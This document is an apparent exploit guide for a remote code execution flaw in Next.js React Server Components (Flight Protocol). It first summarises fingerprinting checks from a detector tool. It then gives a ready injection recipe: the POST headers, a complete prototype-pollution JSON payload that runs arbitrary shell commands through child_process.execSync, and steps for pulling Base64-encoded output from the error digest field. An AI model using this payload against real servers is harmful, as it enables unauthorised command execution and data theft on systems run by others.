# RSC RCE Injection Method (Next.js Flight Protocol)

This document explains the Remote Code Execution (RCE) vulnerability related to the Next.js Flight Protocol (React Server Components) and how to perform the injection.

## Detection Logic (Translated)

The following detection logic is extracted from the `RSC_Detector` tool, translated for clarity:

1. **Passive Scanning**:
   - Detects `Content-Type: text/x-component`.
   - Checks for `window.__next_f` (App Router) in the HTML source.
   - Looks for the `react-server-dom-webpack` reference.

2. **Active Fingerprinting**:
   - Sends a GET request with the `RSC: 1` header.
   - Verifies if the response `Content-Type` is `text/x-component`.
   - Checks if the `Vary` header contains `RSC`.
   - Validates if the body structure matches the **React Flight Protocol** (`\d+:["IHL]`).

---

## Injection Method

The exploit leverages a prototype pollution or a specific deserialization flaw in the React Flight Protocol to execute arbitrary commands on the server.

### 1. Request Structure

- **Method**: `POST`
- **Target URL**: Any valid Next.js Action endpoint (e.g., `/` or `/api/foo`).
- **Headers**:
  ```http
  Next-Action: x
  Content-Type: multipart/form-data; boundary=----WebKitFormBoundary...
  ```

### Payload Breakdown

The core of the attack is a malformed JSON object passed as a form-data field.

**Example Payload JSON:**
```json
{
  "then": "$1:__proto__:then",
  "status": "resolved_model",
  "reason": -1,
  "value": "{\"then\":\"$B1337\"}",
  "_response": {
    "_prefix": "var res=process.mainModule.require('child_process').execSync('COMMAND_HERE').toString('base64');throw Object.assign(new Error('x'),{digest: res});",
    "_chunks": "$Q2",
    "_formData": {
      "get": "$1:constructor:constructor"
    }
  }
}
```

### How it Works

1. **Prototype Trigger**: The payload manipulates the `__proto__` and `constructor` to achieve execution context.
2. **Command Execution**: The `_prefix` field contains the malicious JavaScript code that uses `child_process.execSync` to run the target command.
3. **Data Exfiltration**: The output of the command is Base64 encoded and attached to an `Error` object under the `digest` property.
4. **Response Parsing**: The server throws this error, and the client-side (or attacker's tool) extracts the Base64 output from the `digest` key in the response body.

### 4. Decoding the Output

The output is usually returned within a "digest" field in the response. It needs to be:
1. JSON-parsed to handle escapes.
2. Decoded from Base64 to get the original command output.
